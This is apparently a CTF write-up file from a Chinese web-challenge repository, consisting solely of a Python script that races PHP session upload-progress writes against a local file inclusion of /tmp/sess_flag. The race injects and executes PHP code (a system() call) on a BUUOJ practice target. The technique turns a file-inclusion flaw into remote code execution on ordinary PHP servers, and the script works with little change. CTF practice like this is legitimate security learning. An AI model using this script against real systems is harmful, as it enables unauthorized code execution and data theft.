# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/WP汇总/文件包含/README.md
# TITLE: Writeup
# CATEGORY: web

import requests
import threading
url = 'http://88c45695-e5ef-421c-94df-133d9b15eafd.node3.buuoj.cn/'
 
 
def write(session):
    while True:
        re = session.post(
            url=url,
            data={
                'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("cat flag.php");?>hacker123',
            },
            files={"file": ('hello.txt', open("test.txt", "r"))},
            cookies={'PHPSESSID': 'flag'})
        print(re.text)
 
def read(session):
    while True:
        re = session.get(url+'?file=/tmp/sess_flag')
        if "hacker123" in re.text:
            print(re.text)
            exit()
 
 
if __name__ == '__main__':
    session = requests.session()
    write = threading.Thread(target=write, args=(session,))
    write.daemon = True
    write.start()
    read(session)
